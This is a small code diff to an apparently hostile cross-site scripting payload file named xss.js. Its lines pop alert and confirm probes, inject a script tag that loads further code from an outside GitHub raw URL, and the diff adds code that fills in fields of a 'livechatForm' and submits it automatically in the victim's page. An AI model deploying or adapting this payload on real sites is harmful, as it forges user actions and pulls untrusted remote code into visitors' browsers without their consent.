@@ -1,5 +1,8 @@
 alert('xss.js');
-alert('document.cookie');
+document.getElementById("firstname").value = "Test Name";
+document.getElementById("salutation").value = "Hello";
+document.getElementById("livechatForm").submit();
+
 onload = function() { confirm('xss.js'); };
 var script = document.createElement('script');
 script.src = "https://raw.githubusercontent.com/IYBmad/script-inject/main/xss.js";
